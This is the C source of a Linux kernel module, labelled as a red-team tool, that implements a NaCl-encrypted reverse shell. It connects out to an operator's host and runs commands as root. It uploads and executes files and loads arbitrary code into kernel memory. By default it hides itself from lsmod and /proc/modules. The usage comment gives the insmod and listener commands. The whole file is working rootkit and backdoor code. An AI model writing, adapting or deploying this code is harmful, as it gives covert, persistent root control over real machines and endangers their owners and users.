/*
 * kshell_nacl.c — NaCl-encrypted kernel reverse shell
 *
 * Uses embedded TweetNaCl (crypto_secretbox = XSalsa20 + Poly1305) for
 * authenticated encryption. No dependency on the kernel crypto API — the
 * entire NaCl implementation is in tweetnacl_kernel.h (~300 lines of C).
 *
 * This works on ALL Linux kernels from 2.6 to latest because:
 *   - TweetNaCl is pure C with no kernel API dependencies
 *   - Only needs linux/types.h and linux/string.h (available since 2.6)
 *   - The kernel socket API (sock_create, kernel_connect) is stable since 2.6
 *
 * Wire protocol:
 *   Each message is framed as:
 *     [4-byte LE total_len][24-byte nonce][ciphertext (padded secretbox)]
 *
 *   crypto_secretbox expects:
 *     plaintext:  [32 zero bytes][actual message]
 *     ciphertext: [16 zero bytes][16-byte authenticator][encrypted message]
 *
 *   We strip the 16-byte zero prefix from ciphertext before sending,
 *   and strip the 32-byte zero prefix from plaintext after decrypting.
 *
 * Usage:
 *   KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
 *   python3 kernel/lp/listener.py --port 4444 --key $KEY --nacl
 *   insmod kshell_nacl.ko host=127.0.0.1 port=4444 key=$KEY
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/random.h>
#include <linux/kprobes.h>
#include <net/sock.h>

/* Embedded TweetNaCl — pure C, no kernel crypto API needed */
#include "tweetnacl_kernel.h"

/* Base64 decoder for file transfer */
#include "b64_kernel.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team Lab");
MODULE_DESCRIPTION("NaCl-encrypted kernel reverse shell (embedded TweetNaCl, 2.6+)");

static char *host = "127.0.0.1";
module_param(host, charp, 0444);

static int port = 4444;
module_param(port, int, 0444);

static char *key = "";
module_param(key, charp, 0444);
MODULE_PARM_DESC(key, "256-bit PSK as hex (64 chars)");

static int persist = 0;
module_param(persist, int, 0444);
MODULE_PARM_DESC(persist, "1=stay loaded, 0=fire-and-forget (default)");

static struct task_struct *shell_thread;

/*
 * All runtime state lives in this heap-allocated struct.
 * In fire-and-forget mode, the module's .bss/.data are freed after init,
 * so the kthread MUST NOT reference any module statics.
 * Everything goes through kctx which is kmalloc'd and survives.
 */
struct kshell_ctx {
    char host[64];
    int port;
    u8 key[32];
    int ff;
    u64 nonce_ctr;
    struct socket *sock;
};
static struct kshell_ctx *kctx;

/* --- Hex decode --- */
static int hex_to_bytes(const char *hex, u8 *out, int len)
{
    int i;
    for (i = 0; i < len; i++) {
        int hi, lo;
        char c = hex[i * 2];
        if      (c >= '0' && c <= '9') hi = c - '0';
        else if (c >= 'a' && c <= 'f') hi = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') hi = c - 'A' + 10;
        else return -1;
        c = hex[i * 2 + 1];
        if      (c >= '0' && c <= '9') lo = c - '0';
        else if (c >= 'a' && c <= 'f') lo = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') lo = c - 'A' + 10;
        else return -1;
        out[i] = (hi << 4) | lo;
    }
    return 0;
}

/* --- Socket helpers --- */
static __be32 parse_ip(const char *s)
{
    unsigned a, b, c, d;
    if (sscanf(s, "%u.%u.%u.%u", &a, &b, &c, &d) != 4)
        return htonl(INADDR_LOOPBACK);
    return htonl((a << 24) | (b << 16) | (c << 8) | d);
}

static int ksend_raw(struct socket *sock, const void *buf, int len)
{
    struct msghdr msg = {};
    struct kvec iov = { .iov_base = (void *)buf, .iov_len = len };
    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

static int krecv_raw(struct socket *sock, void *buf, int len)
{
    struct msghdr msg = {};
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    return kernel_recvmsg(sock, &msg, &iov, 1, len, 0);
}

/*
 * ksend_encrypted — Encrypt and send a message using NaCl secretbox.
 *
 * Wire format: [4-byte LE total_len][24-byte nonce][authenticator + ciphertext]
 *
 * crypto_secretbox requires 32 zero-byte prefix on plaintext.
 * It produces 16 zero-byte prefix on ciphertext (which we skip).
 */
static int ksend_encrypted(struct kshell_ctx *ctx, const u8 *data, int len)
{
    u8 nonce[crypto_secretbox_NONCEBYTES];
    u8 *padded_pt;
    u8 *padded_ct;
    int padded_len;
    int wire_len;
    u32 frame_len;
    int ret;

    padded_len = crypto_secretbox_ZEROBYTES + len;
    padded_pt = kmalloc(padded_len, GFP_KERNEL);
    padded_ct = kmalloc(padded_len, GFP_KERNEL);
    if (!padded_pt || !padded_ct) {
        kfree(padded_pt);
        kfree(padded_ct);
        return -ENOMEM;
    }

    memset(padded_pt, 0, crypto_secretbox_ZEROBYTES);
    memcpy(padded_pt + crypto_secretbox_ZEROBYTES, data, len);

    memset(nonce, 0, 16);
    *(u64 *)(nonce + 16) = cpu_to_le64(ctx->nonce_ctr++);

    ret = crypto_secretbox(padded_ct, padded_pt, padded_len, nonce, ctx->key);
    if (ret) {
        kfree(padded_pt);
        kfree(padded_ct);
        return ret;
    }

    wire_len = crypto_secretbox_NONCEBYTES +
               (padded_len - crypto_secretbox_BOXZEROBYTES);

    frame_len = cpu_to_le32(wire_len);
    ret = ksend_raw(ctx->sock, &frame_len, 4);
    if (ret > 0)
        ret = ksend_raw(ctx->sock, nonce, crypto_secretbox_NONCEBYTES);
    if (ret > 0)
        ret = ksend_raw(ctx->sock, padded_ct + crypto_secretbox_BOXZEROBYTES,
                        padded_len - crypto_secretbox_BOXZEROBYTES);

    kfree(padded_pt);
    kfree(padded_ct);
    return ret;
}

/*
 * krecv_encrypted — Receive and decrypt a NaCl secretbox message.
 */
static int krecv_encrypted(struct kshell_ctx *ctx, u8 *out, int max_len)
{
    u32 frame_len;
    u8 nonce[crypto_secretbox_NONCEBYTES];
    u8 *wire_ct;    /* authenticator + ciphertext from wire */
    u8 *padded_ct;  /* 16 zero bytes + wire_ct */
    u8 *padded_pt;  /* 32 zero bytes + plaintext (after decrypt) */
    int wire_ct_len;
    int padded_len;
    int pt_len;
    int ret;

    /* Read frame length */
    ret = krecv_raw(ctx->sock, &frame_len, 4);
    if (ret <= 0) return ret;
    frame_len = le32_to_cpu(frame_len);
    if (frame_len > 65536 || frame_len < crypto_secretbox_NONCEBYTES + 16)
        return -EINVAL;

    /* Read nonce */
    ret = krecv_raw(ctx->sock, nonce, crypto_secretbox_NONCEBYTES);
    if (ret <= 0) return ret;

    /* Read authenticator + ciphertext */
    wire_ct_len = frame_len - crypto_secretbox_NONCEBYTES;
    wire_ct = kmalloc(wire_ct_len, GFP_KERNEL);
    if (!wire_ct) return -ENOMEM;

    ret = krecv_raw(ctx->sock, wire_ct, wire_ct_len);
    if (ret <= 0) { kfree(wire_ct); return ret; }

    /* Rebuild padded ciphertext: [16 zero bytes][wire_ct] */
    padded_len = crypto_secretbox_BOXZEROBYTES + wire_ct_len;
    padded_ct = kmalloc(padded_len, GFP_KERNEL);
    padded_pt = kmalloc(padded_len, GFP_KERNEL);
    if (!padded_ct || !padded_pt) {
        kfree(wire_ct);
        kfree(padded_ct);
        kfree(padded_pt);
        return -ENOMEM;
    }

    memset(padded_ct, 0, crypto_secretbox_BOXZEROBYTES);
    memcpy(padded_ct + crypto_secretbox_BOXZEROBYTES, wire_ct, wire_ct_len);
    kfree(wire_ct);

    /* Decrypt + verify */
    ret = crypto_secretbox_open(padded_pt, padded_ct, padded_len, nonce, ctx->key);
    kfree(padded_ct);

    if (ret) {
        pr_debug("kshell_nacl: decrypt failed (bad key or tampered)\n");
        kfree(padded_pt);
        return -EBADMSG;
    }

    /* Extract plaintext (skip 32 zero-byte prefix) */
    pt_len = padded_len - crypto_secretbox_ZEROBYTES;
    if (pt_len > max_len) pt_len = max_len;
    memcpy(out, padded_pt + crypto_secretbox_ZEROBYTES, pt_len);
    kfree(padded_pt);

    return pt_len;
}

/* --- Kprobes symbol resolution (for kload) --- */
static void *resolve_sym(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    void *addr;
    if (register_kprobe(&kp) < 0) return NULL;
    addr = (void *)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/*
 * cmd_upload — Receive a base64-encoded file and write it to disk.
 *
 * Protocol: "!upload <path> <base64_data>"
 * The file is written with 0755 permissions.
 */
static int cmd_upload(const char *args, char *output, int output_len)
{
    const char *path_end;
    char path[256];
    const char *b64_data;
    u8 *decoded;
    int decoded_len;
    struct file *f;
    loff_t pos = 0;
    int path_len;

    /* Parse path (first word) */
    path_end = strchr(args, ' ');
    if (!path_end) {
        snprintf(output, output_len, "usage: !upload <path> <base64_data>\n");
        return -1;
    }
    path_len = path_end - args;
    if (path_len >= sizeof(path)) path_len = sizeof(path) - 1;
    memcpy(path, args, path_len);
    path[path_len] = '\0';
    b64_data = path_end + 1;

    /* Decode base64 */
    decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
    if (!decoded) {
        snprintf(output, output_len, "upload: out of memory\n");
        return -ENOMEM;
    }
    decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
    if (decoded_len < 0) {
        kfree(decoded);
        snprintf(output, output_len, "upload: base64 decode error\n");
        return -1;
    }

    /* Write file */
    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (IS_ERR(f)) {
        kfree(decoded);
        snprintf(output, output_len, "upload: can't create %s: %ld\n",
                path, PTR_ERR(f));
        return PTR_ERR(f);
    }
    kernel_write(f, decoded, decoded_len, &pos);
    filp_close(f, NULL);
    kfree(decoded);

    snprintf(output, output_len, "uploaded %d bytes → %s\n",
            decoded_len, path);
    return 0;
}

/*
 * cmd_run — Execute an uploaded binary as a userspace process.
 *
 * Protocol: "!run <path> [args...]"
 * Runs via call_usermodehelper as root. Waits for completion.
 * Output is captured and sent back.
 */
static int cmd_run(const char *args, char *output, int output_len)
{
    char *full_cmd;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    struct file *f;
    loff_t pos = 0;
    int ret;

    /* Make the binary executable and run it */
    full_cmd = kmalloc(strlen(args) + 128, GFP_KERNEL);
    if (!full_cmd) return -ENOMEM;

    snprintf(full_cmd, strlen(args) + 128,
             "chmod +x %s 2>/dev/null; %s > /tmp/.ksh_out 2>&1", args, args);
    argv[2] = full_cmd;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(full_cmd);

    if (ret < 0) {
        snprintf(output, output_len, "run failed: %d\n", ret);
        return ret;
    }

    /* Read output */
    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
    if (IS_ERR(f)) {
        snprintf(output, output_len, "run: executed (no output)\n");
        return 0;
    }
    memset(output, 0, output_len);
    ret = kernel_read(f, output, output_len - 1, &pos);
    filp_close(f, NULL);
    if (ret >= 0 && ret < output_len) output[ret] = '\0';
    return ret;
}

/*
 * blob_ctx — Context struct passed to every PIC blob as its first argument.
 *
 * The blob's entry signature is: void blob(struct blob_ctx *ctx)
 *
 * This gives the blob:
 *   ctx->send()    — send data back to the operator through the encrypted channel
 *   ctx->resolve() — resolve kernel symbols by name (wraps kprobes)
 *   ctx->printf()  — convenience: format + send a string
 *
 * The blob doesn't need to know about sockets, NaCl, or kshell internals.
 * It just calls ctx->send(ctx, "hello", 5) and the data arrives at the
 * operator's terminal in real time, through the encrypted tunnel.
 *
 * This struct is also available as a header for blob authors:
 *   #include "blob_ctx.h"
 */
struct blob_ctx {
    /* Send data to operator through the encrypted channel. Returns bytes sent. */
    int (*send)(struct blob_ctx *ctx, const void *data, int len);

    /* Resolve a kernel symbol by name. Returns address or NULL. */
    void *(*resolve)(const char *name);

    /* Convenience: snprintf + send. Returns bytes sent. */
    int (*printf)(struct blob_ctx *ctx, const char *fmt, ...);

    /* --- private (blob should not touch) --- */
    void *_kctx;  /* kshell_ctx for encrypted send */
};

/* Implementation of ctx->send — encrypts and sends through the kshell socket */
static int blob_ctx_send(struct blob_ctx *ctx, const void *data, int len)
{
    struct kshell_ctx *kctx = (struct kshell_ctx *)ctx->_kctx;
    if (!kctx || !kctx->sock)
        return -1;
    return ksend_encrypted(kctx, (const u8 *)data, len);
}

/* Implementation of ctx->resolve — wraps kprobes symbol lookup */
static void *blob_ctx_resolve(const char *name)
{
    return resolve_sym(name);
}

/* Implementation of ctx->printf — format and send */
static int blob_ctx_printf(struct blob_ctx *ctx, const char *fmt, ...)
{
    va_list args;
    char buf[1024];
    int len;

    va_start(args, fmt);
    len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    if (len > 0)
        return blob_ctx_send(ctx, buf, len);
    return 0;
}

/*
 * kload_thread — kthread wrapper that executes a PIC blob.
 *
 * Sets up a blob_ctx, passes it to the blob as the first argument.
 * The blob runs in its own kthread — the shell is NOT blocked.
 */
struct kload_info {
    void *exec_mem;
    int size;
    struct kshell_ctx *kctx;  /* for sending data back */
};

static int kload_thread(void *data)
{
    struct kload_info *info = (struct kload_info *)data;
    struct blob_ctx bctx;
    void (*entry)(struct blob_ctx *) = (void (*)(struct blob_ctx *))info->exec_mem;

    /* Set up the context that the blob receives */
    bctx.send = blob_ctx_send;
    bctx.resolve = blob_ctx_resolve;
    bctx.printf = blob_ctx_printf;
    bctx._kctx = info->kctx;

    pr_debug("kload: kthread running blob at %px (%d bytes) with ctx\n",
            info->exec_mem, info->size);

    /* Call the blob — it receives &bctx as its first argument */
    entry(&bctx);

    pr_debug("kload: blob returned\n");
    kfree(info);
    return 0;
}

/*
 * cmd_kload — Load a PIC blob, spawn a kthread to run it.
 *
 * Protocol: "!kload <base64_data>"
 *
 * 1. Base64-decode the blob
 * 2. module_alloc + set_memory_x → executable kernel pages
 * 3. kthread_run → blob runs in its own kthread
 * 4. Shell returns immediately
 *
 * The blob can be anything — short-lived or persistent.
 * The shell stays alive regardless.
 */
static int cmd_kload(const char *b64_data, char *output, int output_len)
{
    typedef void *(*module_alloc_t)(unsigned long);
    typedef int (*set_memory_x_t)(unsigned long, int);
    module_alloc_t fn_alloc;
    set_memory_x_t fn_smx;
    u8 *decoded;
    void *exec_mem;
    int decoded_len, numpages;
    struct kload_info *info;
    struct task_struct *t;

    fn_alloc = (module_alloc_t)resolve_sym("module_alloc");
    fn_smx = (set_memory_x_t)resolve_sym("set_memory_x");
    if (!fn_alloc || !fn_smx) {
        snprintf(output, output_len,
                "kload: can't resolve module_alloc/set_memory_x\n");
        return -1;
    }

    decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
    if (!decoded) return -ENOMEM;
    decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
    if (decoded_len <= 0) {
        kfree(decoded);
        snprintf(output, output_len, "kload: base64 decode error\n");
        return -1;
    }

    numpages = PAGE_ALIGN(decoded_len) >> PAGE_SHIFT;
    exec_mem = fn_alloc(PAGE_ALIGN(decoded_len));
    if (!exec_mem) {
        kfree(decoded);
        snprintf(output, output_len, "kload: module_alloc failed\n");
        return -ENOMEM;
    }

    memcpy(exec_mem, decoded, decoded_len);
    kfree(decoded);

    if (fn_smx((unsigned long)exec_mem, numpages)) {
        snprintf(output, output_len,
                "kload: set_memory_x failed (strict W^X kernel?)\n");
        return -1;
    }

    info = kmalloc(sizeof(*info), GFP_KERNEL);
    if (!info) return -ENOMEM;
    info->exec_mem = exec_mem;
    info->size = decoded_len;
    info->kctx = kctx; /* global kshell context — for sending data back */

    t = kthread_run(kload_thread, info, "kblob");
    if (IS_ERR(t)) {
        kfree(info);
        snprintf(output, output_len, "kload: kthread_run failed\n");
        return PTR_ERR(t);
    }

    snprintf(output, output_len,
            "kload: %d bytes at %px → kthread PID %d (shell stays alive)\n",
            decoded_len, exec_mem, t->pid);
    return 0;
}

/* --- Command execution (regular shell commands) --- */
static int run_cmd(const char *cmd, char *output, int output_len)
{
    char *full_cmd;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    struct file *f;
    loff_t pos = 0;
    int ret;

    full_cmd = kmalloc(strlen(cmd) + 64, GFP_KERNEL);
    if (!full_cmd) return -ENOMEM;
    snprintf(full_cmd, strlen(cmd) + 64, "%s > /tmp/.ksh_out 2>&1", cmd);
    argv[2] = full_cmd;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(full_cmd);

    if (ret < 0) {
        snprintf(output, output_len, "exec failed: %d\n", ret);
        return ret;
    }

    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
    if (IS_ERR(f)) {
        snprintf(output, output_len, "(no output)\n");
        return 0;
    }

    memset(output, 0, output_len);
    ret = kernel_read(f, output, output_len - 1, &pos);
    filp_close(f, NULL);
    if (ret >= 0 && ret < output_len) output[ret] = '\0';
    return ret;
}

/* --- Shell loop --- */
static int shell_loop(void *data)
{
    struct kshell_ctx *ctx = (struct kshell_ctx *)data;
    struct sockaddr_in addr;
    char *recv_buf = NULL;
    char *output_buf = NULL;
    int ret, len;
    const char *banner =
        "\n[kshell_nacl] encrypted kernel shell (NaCl secretbox)\n"
        "[kshell_nacl] commands:\n"
        "  <cmd>                — shell command (root)\n"
        "  !upload <path> <b64> — upload file to target\n"
        "  !run <path> [args]   — execute uploaded binary\n"
        "  !kload <b64>         — PIC blob → own kthread in ring 0\n"
        "  exit                 — disconnect\n\n# ";

    /* Large recv buffer for file uploads (base64-encoded binaries) */
    recv_buf = kmalloc(1024 * 1024, GFP_KERNEL); /* 1 MB */
    output_buf = kmalloc(65536, GFP_KERNEL);
    if (!recv_buf || !output_buf) goto out;

    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &ctx->sock);
    if (ret < 0) goto out;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ctx->port);
    addr.sin_addr.s_addr = parse_ip(ctx->host);

    pr_debug("kshell_nacl: connecting to %s:%d (NaCl encrypted)\n",
            ctx->host, ctx->port);

    while (1) {
        if (!ctx->ff && kthread_should_stop()) goto out_sock;
        ret = kernel_connect(ctx->sock, (struct sockaddr *)&addr,
                            sizeof(addr), 0);
        if (ret == 0) break;
        ssleep(3);
    }

    pr_debug("kshell_nacl: connected, sending encrypted banner\n");
    ksend_encrypted(ctx, (const u8 *)banner, strlen(banner));

    while (1) {
        if (!ctx->ff && kthread_should_stop()) break;
        memset(recv_buf, 0, 1024 * 1024);
        len = krecv_encrypted(ctx, (u8 *)recv_buf, (1024 * 1024) - 1);
        if (len <= 0) break;

        while (len > 0 && (recv_buf[len-1] == '\n' || recv_buf[len-1] == '\r'))
            recv_buf[--len] = '\0';

        if (len == 0) {
            ksend_encrypted(ctx, (const u8 *)"# ", 2);
            continue;
        }

        if (strcmp(recv_buf, "exit") == 0) {
            ksend_encrypted(ctx,
                (const u8 *)"[kshell_nacl] disconnecting\n", 28);
            break;
        }

        pr_debug("kshell_nacl: cmd: %s\n", recv_buf);
        memset(output_buf, 0, 65536);

        /* Dispatch !-commands or regular shell commands */
        if (strncmp(recv_buf, "!upload ", 8) == 0) {
            cmd_upload(recv_buf + 8, output_buf, 65536);
        } else if (strncmp(recv_buf, "!run ", 5) == 0) {
            cmd_run(recv_buf + 5, output_buf, 65536);
        } else if (strncmp(recv_buf, "!kload ", 7) == 0) {
            cmd_kload(recv_buf + 7, output_buf, 65536);
        } else if (strcmp(recv_buf, "!help") == 0) {
            snprintf(output_buf, 65536,
                "commands:\n"
                "  <cmd>                — shell command (root)\n"
                "  !upload <path> <b64> — upload file\n"
                "  !run <path> [args]   — run uploaded binary\n"
                "  !kload <b64>         — PIC blob → ring 0\n"
                "  exit                 — disconnect\n");
        } else {
            run_cmd(recv_buf, output_buf, 65536);
        }

        len = strlen(output_buf);
        if (len > 0)
            ksend_encrypted(ctx, (const u8 *)output_buf, len);
        ksend_encrypted(ctx, (const u8 *)"# ", 2);
    }

out_sock:
    if (ctx->sock) { sock_release(ctx->sock); ctx->sock = NULL; }
out:
    kfree(recv_buf);
    kfree(output_buf);
    /* Don't free ctx — it may be needed if we reconnect or for cleanup */
    return 0;
}

static int __init kshell_nacl_init(void)
{
    pr_debug("kshell_nacl: loading (target %s:%d, NaCl encrypted)\n",
            host, port);

    if (!key || strlen(key) != 64) {
        pr_debug("kshell_nacl: key must be 64 hex chars\n");
        return -EINVAL;
    }
    /* Allocate context — this kmalloc'd struct survives module unload
     * in fire-and-forget mode because the kernel doesn't track it */
    kctx = kmalloc(sizeof(*kctx), GFP_KERNEL);
    if (!kctx) return -ENOMEM;
    memset(kctx, 0, sizeof(*kctx));
    strncpy(kctx->host, host, sizeof(kctx->host) - 1);
    kctx->port = port;
    kctx->ff = !persist;
    kctx->nonce_ctr = 0;
    kctx->sock = NULL;

    if (hex_to_bytes(key, kctx->key, 32)) {
        pr_debug("kshell_nacl: invalid hex in key\n");
        kfree(kctx);
        return -EINVAL;
    }

    shell_thread = kthread_run(shell_loop, kctx, "kshell_nacl");
    if (IS_ERR(shell_thread))
        return PTR_ERR(shell_thread);

    pr_debug("kshell_nacl: thread started (pid %d)\n", shell_thread->pid);

    if (!persist) {
        /*
         * Stealth mode: return 0 (module loads) but remove ourselves
         * from the module list so we don't appear in lsmod or
         * /proc/modules. The module's .text stays mapped (kthread needs
         * it) but we're invisible to userspace enumeration.
         *
         * insmod succeeds silently — no error, no trace in lsmod.
         */
        list_del_init(&THIS_MODULE->list);
        pr_debug("kshell_nacl: hidden from /proc/modules\n");
    }

    return 0;
}

static void __exit kshell_nacl_exit(void)
{
    if (shell_thread) { kthread_stop(shell_thread); shell_thread = NULL; }
    if (kctx && kctx->sock) { sock_release(kctx->sock); kctx->sock = NULL; }
    kfree(kctx); kctx = NULL;

    {
        char *argv[] = { "/bin/rm", "-f", "/tmp/.ksh_out", NULL };
        char *envp[] = { "HOME=/", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }
}

module_init(kshell_nacl_init);
module_exit(kshell_nacl_exit);
